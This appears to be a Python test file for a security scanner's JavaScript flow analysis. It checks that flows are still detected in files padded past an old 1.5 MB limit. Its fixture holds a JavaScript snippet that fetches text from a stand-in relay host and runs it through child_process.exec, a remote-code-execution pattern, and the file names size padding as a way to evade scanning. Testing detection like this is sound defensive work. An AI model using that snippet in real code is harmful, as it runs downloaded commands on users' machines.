"""The JavaScript flow analysis reads a file as large as the scanner reads whole.

It was given nothing of a file over 1.5 MB, so a payload padded past that size had no flow findings, no reach analysis and no
summaries: every `CAP.JS.FLOW.*` rule and every grading that depends on the analysis went quiet for that file alone. Inert text:
comment lines for padding and a small program built from words, never run.
"""

from __future__ import annotations

import pytest

from cordon_scanner.analysis.javascript.flow.vocabulary import MAX_BYTES
from cordon_scanner.analysis.javascript.js_flow import JsFlow
from cordon_scanner.analysis.javascript.js_persist import JsPersistence
from cordon_scanner.foundation.limits import DEFAULT_LIMITS, WHOLE_FILE_BYTES
from kits.padding import Padding

# A fetched text handed to a process: a flow the analysis names (`network_response` into `process`).
PAYLOAD = (
    'const r = await fetch("https://relay.example.invalid/a");\n'
    "const t = await r.text();\n"
    'require("child_process").exec(t);\n'
)


class Flows:
    @staticmethod
    def has_the_flow(text: str) -> bool:
        return any(
            f.sink == "process" and "network_response" in f.sources for f in JsFlow.flows(text)
        )


class TestTheLimit:
    def test_it_is_what_the_scanner_reads_whole(self) -> None:
        assert DEFAULT_LIMITS.max_file_bytes == WHOLE_FILE_BYTES
        assert DEFAULT_LIMITS.max_file_bytes <= MAX_BYTES


class TestAFlowPastWhatTheAnalysisOnceRead:
    def test_a_small_file_has_the_flow(self) -> None:
        assert Flows.has_the_flow(PAYLOAD)

    @pytest.mark.parametrize("before", [1_500_100, 2_500_000, 5_000_000])
    def test_a_flow_after_the_old_limit_is_found(self, before: int) -> None:
        assert Flows.has_the_flow(Padding.lines(before) + PAYLOAD)

    def test_a_flow_before_a_large_padding_is_found(self) -> None:
        assert Flows.has_the_flow(PAYLOAD + Padding.lines(2_500_000))

    def test_a_large_file_with_no_flow_has_none(self) -> None:
        assert not JsFlow.flows(Padding.lines(2_500_000) + "module.exports = 1;\n")


class TestTheOtherReadingsOfTheSameAnalysis:
    def test_the_requests_after_the_old_limit_are_found(self) -> None:
        text = Padding.lines(1_600_000) + 'fetch("https://registry.npmjs.org/x/-/x-1.0.0.tgz");\n'
        assert JsFlow.requests(text)

    def test_the_summaries_of_a_large_file_are_read_not_marked_unread(self) -> None:
        facts = JsFlow.summaries(Padding.lines(1_600_000) + PAYLOAD)
        assert facts.get("js.request") != [["unread", 1]]

    def test_the_reach_analysis_of_a_large_file_rules_something_out(self) -> None:
        assert JsFlow.deferred_spans(Padding.lines(1_600_000) + PAYLOAD) is not None

    def test_the_persistence_reading_of_a_large_file_is_made(self) -> None:
        # Not asserted to find lines: only that a file over the old limit is given the analysis (a frozenset, never an early return).
        assert isinstance(
            JsPersistence.named_only_lines(Padding.lines(1_600_000) + PAYLOAD), frozenset
        )


class TestAFileBeyondEvenThat:
    def test_it_is_still_marked_unread(self) -> None:
        text = "var a = 1;\n" * (MAX_BYTES // 8)
        assert len(text) > MAX_BYTES
        assert JsFlow.summaries(text)["js.request"] == [["unread", 1]]
